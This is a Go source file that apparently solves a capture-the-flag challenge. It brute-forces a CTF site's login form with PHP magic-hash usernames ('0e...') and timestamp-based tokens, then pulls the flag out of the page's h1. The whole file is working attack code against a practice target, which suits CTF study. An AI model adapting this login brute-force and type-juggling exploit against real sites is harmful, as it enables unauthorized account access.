package main

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
	"golang.org/x/net/html"
)

const (
	initial = 0
	end = 30
	exitCode = 3
	uri = "https://love2solve.com/ctf/"
	tagH1 = "h1"
	endPoint = 2
	loading = "Loading"
)

func main() {
	fmt.Printf(loading)
	points := ""

	users := []string{"0e", "0e1", "0e12", "0e120", "0e1202", "0e12021"}
	for in:=initial; in <= end; in++ {
		// "end attempts with users slice"
		for _, user := range users {
			for i:=initial; i <= end; i++ {
				points = points + "."
				// 0 to 30 => random
				token := fmt.Sprintf("%d%d", time.Now().Unix(), i)
				endpoint := uri
				data := url.Values{}
				data.Set("username", user)
				data.Set("token", token)
				data.Set("SubmitButton", "Login")

				client := &http.Client{}
				r, err := http.NewRequest("POST", endpoint, strings.NewReader(data.Encode())) // URL-encoded payload
				if err != nil {
					log.Fatal(err)
				}
				r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))

				res, err := client.Do(r)
				if err != nil {
					log.Fatal(err)
				}
				//log.Println(res.Status)
				fmt.Print(points)
				if len(points) > endPoint {
					points = ""
					clear()
					fmt.Printf(loading)
				}
				defer res.Body.Close()
				resBody, err := ioutil.ReadAll(res.Body)
				if err != nil {
					log.Fatal(err)
				}
				strBody := string(resBody)
				if !strings.Contains(strBody, "Wrong token") {
					doc, _ := html.Parse(strings.NewReader(strBody))
					bn, err := Body(doc)
					if err != nil {
						return
					}
					bodyLine := renderNode(bn)
					// Result message
					log.Println("GOOD NEWS!!")
					log.Printf("- Username: %s\n", user)
					log.Printf("- Token: %s\n", token)
					log.Printf("- Flag: %v\n", extractFlag(bodyLine))
					os.Exit(exitCode)
				}
			}
		}
	}
}

func Body(doc *html.Node) (*html.Node, error) {
	var body *html.Node
	var crawler func(*html.Node)
	crawler = func(node *html.Node) {
		if node.Type == html.ElementNode && node.Data == tagH1 {
			body = node
			return
		}
		for child := node.FirstChild; child != nil; child = child.NextSibling {
			crawler(child)
		}
	}
	crawler(doc)
	if body != nil {
		return body, nil
	}
	return nil, errors.New("Missing <h1> in the node tree")
}

func renderNode(n *html.Node) string {
	var buf bytes.Buffer
	w := io.Writer(&buf)
	html.Render(w, n)
	return buf.String()
}

func extractFlag(flagLine string) string {
	return flagLine[35:83]
}

func clear() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}
